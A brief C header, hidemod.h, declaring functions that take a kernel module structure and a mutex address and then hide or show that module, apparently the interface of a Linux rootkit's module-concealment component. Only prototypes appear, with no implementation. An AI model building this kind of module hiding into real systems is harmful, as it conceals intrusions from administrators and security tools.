#ifndef _HIDEMOD_H_
#define _HIDEMOD_H_

void hidemod_setmutex(unsigned long mutex_addr);
void hidemod_setmodule(struct module *to_hide);
void hide_module(void);
void show_module(void);

#endif
